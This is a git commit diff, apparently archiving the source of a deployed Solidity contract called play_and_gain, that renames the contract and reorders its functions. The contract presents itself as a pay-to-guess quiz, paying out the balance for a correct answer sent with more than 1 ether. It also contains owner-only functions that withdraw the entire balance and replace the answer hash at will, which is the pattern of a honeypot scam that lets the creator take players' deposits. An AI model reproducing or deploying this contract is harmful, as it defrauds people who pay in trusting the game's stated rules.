bedfae2cd7ae622979b6b2e4ef5982e56bc23e08
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-18 19:27:09 +0700

    add contract play_and_gain

--- PLAY_AND_GAIN.sol
+++ PLAY_AND_GAIN.sol
@@ -1,36 +1,39 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PLAY_AND_GAIN at 0xeD710216DA4B1416A78768790Ca9Aa3633Ca110f
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract play_and_gain at 0x349D9314154EF0999FACDbbcEa2d9737B0529570
 */
 pragma solidity ^0.4.20;
 
-contract PLAY_AND_GAIN
+contract play_and_gain
 {
+    function Try(string _response)
+    external
+    payable
+    {
+        require(msg.sender == tx.origin);
+        
+        if(responseHash == keccak256(_response) && msg.value>1 ether)
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
     string public question;
  
     address questionSender;
   
     bytes32 responseHash;
  
-    function StartGame(string _question,string _response)
+    function start_play_and_gain(string _question,string _response)
     public
     payable
     {
         if(responseHash==0x0)
         {
             responseHash = keccak256(_response);
+            
             question = _question;
+            
             questionSender = msg.sender;
-        }
-    }
-    
-    function Play(string _response)
-    external
-    payable
-    {
-        require(msg.sender == tx.origin);
-        if(responseHash == keccak256(_response) && msg.value>1 ether)
-        {
-            msg.sender.transfer(this.balance);
         }
     }
     
@@ -39,6 +42,7 @@ contract PLAY_AND_GAIN
     payable
     {
        require(msg.sender==questionSender);
+       
        msg.sender.transfer(this.balance);
     }
     
@@ -47,10 +51,11 @@ contract PLAY_AND_GAIN
     payable
     {
         require(msg.sender==questionSender);
+        
         question = _question;
+        
         responseHash = _responseHash;
     }
     
     function() public payable{}
-    
 }
